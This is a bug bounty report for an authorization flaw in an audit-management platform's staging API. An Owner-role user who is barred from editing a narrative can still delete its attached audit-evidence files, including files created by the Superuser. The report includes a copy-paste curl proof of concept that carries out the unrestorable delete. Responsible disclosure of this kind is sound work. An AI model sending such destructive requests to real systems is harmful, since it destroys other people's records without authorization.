# BUG-010 — BFLA: Attachment deletion bypasses parent-object authorization (org-wide destructive file delete)

**Severity:** P3 (integrity) — recommendation
**Target:** `https://bugbounty1.qe.optrostaging.ai` (Optro / AuditBoard QE staging)
**Class:** Broken Function Level Authorization (BFLA) / object-level authorization gap
**Status:** Confirmed end-to-end on 2026-11-07, session (r)

---

## Summary

A user whose role is **Owner** (role_id 5) is **denied edit permission** on a Narrative
object that belongs to another user (`narrative:action.edit` → 422) and is **denied edit**
on files attached to that narrative (`file:action.edit` → 422) — but the **same account can
DELETE those attachments** (`file:action.delete` → granted). Deletion succeeds on files
created by **any** user, including files created by **user id 1 (Superuser)** in 2016 — real
SOX audit evidence on a real business object. The delete is soft (record 410s afterwards)
and is not restorable through the API.

The permission matrix therefore places attachment deletion **outside** the parent object's
edit boundary: an attacker who cannot so much as rename a narrative can destroy the audit
evidence attached to it, silently degrading the integrity of SOX audit content.

## Authorization matrix observed (as B, role_id 5 / Owner)

| Action | Endpoint | Result |
|---|---|---|
| View Narrative 31 (owned/scope user 65) | `GET /api/v1/narratives/31` | 200 |
| **Edit** Narrative 31 | `PUT /api/v1/narratives/31` | **422 `narrative:action.edit`** |
| View file 2660 (creator A/231) | `GET /api/v1/files/2660` | 200 (+ presigned S3 URL) |
| **Edit** file 2660 (rename) | `PUT /api/v1/files/2660` | **422 `file:action.edit`** |
| **Delete** file 2661 (creator A/231) | `DELETE /api/v1/files/2661` | **200 — deleted** |
| Re-read file 2661 after delete | `GET /api/v1/files/2661` | **410 ModelAlreadyDestroyedError** |
| `_permissions` on file 1247 (creator user 1 / Superuser, 2016) | `GET /api/v1/files/1247` | `{"action.delete": true, "action.view": true}` |

`_permissions.action.delete: true` is returned for **every** file B can view, regardless of
the file's creator (verified on files created by 231, and by user 1). The delete we executed
returned a `global_audit` entry — the action is logged, but it is **not prevented**.

## Proof-of-concept (copy-paste ready)

Actor B = role_id 5 (Owner), user id 230. Target file 2661 = `assist_attach_inject.pdf`,
`creator_user_id: 231`, attached to Narrative 31 (`scope owner_users: [65]`; B has no edit
right on that narrative).

```bash
BASE="https://bugbounty1.qe.optrostaging.ai"
TOKEN_B="230:<B-user-token>"

# 1) Confirm the parent object edit boundary: B CANNOT edit Narrative 31
curl -sS -X PUT "${BASE}/api/v1/narratives/31" \
  -H "token: ${TOKEN_B}" \
  -H "X-Optro-Bug-Bounty: zeno0" \
  -H "X-Auditboard-Product: System" \
  -H "X-Auditboard-Module: account" \
  -H "Content-Type: application/json" \
  -d '{"narrative":{"name":"t031 probe"}}'
# -> 422 {"code":"ModelActionPermissionDenied",
#         "detail":"... (Permission: narrative:action.edit)"}

# 2) Confirm the file edit boundary: B CANNOT rename A's file
curl -sS -X PUT "${BASE}/api/v1/files/2660" \
  -H "token: ${TOKEN_B}" \
  -H "X-Optro-Bug-Bounty: zeno0" \
  -H "X-Auditboard-Product: System" \
  -H "X-Auditboard-Module: account" \
  -H "Content-Type: application/json" \
  -d '{"file":{"name":"t031_xu_marker.pdf"}}'
# -> 422 {"code":"ModelActionPermissionDenied",
#         "detail":"... (Permission: file:action.edit)"}

# 3) But B CAN DELETE A's attachment (cross-account, outside edit boundary)
curl -sS -X DELETE "${BASE}/api/v1/files/2661" \
  -H "token: ${TOKEN_B}" \
  -H "X-Optro-Bug-Bounty: zeno0" \
  -H "X-Auditboard-Product: System" \
  -H "X-Auditboard-Module: account"
# -> 200 {"meta":{...},"global_audit":[{"object_id":2661,"object_type":"file",...}]}

# 4) The attachment is gone (soft-deleted, unrestorable)
curl -sS "${BASE}/api/v1/files/2661" \
  -H "token: ${TOKEN_B}" \
  -H "X-Optro-Bug-Bounty: zeno0" \
  -H "X-Auditboard-Product: System" \
  -H "X-Auditboard-Module: account"
# -> 410 {"code":"ModelNotFoundError",
#         "detail":"Model file ... has already been deleted."}

# 5) Scope proof — the same delete grant exists on evidence created by the Superuser
curl -sS "${BASE}/api/v1/files/1247" \
  -H "token: ${TOKEN_B}" \
  -H "X-Optro-Bug-Bounty: zeno0" \
  -H "X-Auditboard-Product: System" \
  -H "X-Auditboard-Module: account"
# -> 200, file "Fixed Asset Flowchart.vsdx" (creator_user_id: 1),
#    _permissions: {"action.delete": true, "action.view": true}
```

## Impact

- **Audit evidence integrity:** narratives are SOX process documentation (flowcharts,
  narratives). Their attachments are audit evidence. A user with no edit rights on the
  narrative can permanently remove that evidence — attachments are soft-deleted but have
  **no API restore path** (PUT → 410 `ModelAlreadyDestroyedError`, `/restore` → 404).
- **Org-wide reach:** the grant is not scoped to the attacker's own uploads. The delete
  permission flag is present on files created by arbitrary users, including **user 1
  (Superuser)** — the 2016-era `Fixed Asset Flowchart.vsdx` / `.PNG` on Narrative 31.
- **Contradiction with the intended boundary:** the server explicitly denies
  `narrative:action.edit` and `file:action.edit` to the same actor on the same objects.
  Delete is a strictly stronger content-mutation than edit; granting it while denying edit
  is inconsistent and indicates the file-delete policy check is not wired to the parent
  object's authorization context.

## What this is NOT (honest scoping)

- No confidentiality impact demonstrated: file read remains correctly gated (B can only
  view files it is otherwise entitled to view; BUG-008-era cross-account file *read* is a
  separate pre-existing behavior).
- The delete is recorded in `global_audit` — detection exists, prevention does not.
- We did not enumerate every parent type; confirmed live on Narrative-attached files and
  Attachment-parented files (2634, same flag), and by permission flags on Superuser-created
  files.

## Remediation suggestions

1. Gate `file:action.delete` on the parent `fileable` object's edit authorization (or on
   file ownership), so attachment deletion cannot outrun the parent's edit boundary.
2. Add an API restore path (or recycle-bin UI) for soft-deleted attachments.
3. Consider a confirmation/step-up for deletes on files the actor did not create.

## Tester state disclosure

- File 2661 (`assist_attach_inject.pdf`, creator A/231) remains deleted — it was a test
  artifact uploaded by our own victim account during earlier sessions; we deliberately used
  it for the destructive proof instead of a real business file. It cannot be restored via
  the API (verified above).
- File 2660 (`assist_attach_clean.pdf`) was only renamed in a denied 422 probe; its name was
  never changed (the write was refused). No business data was modified.
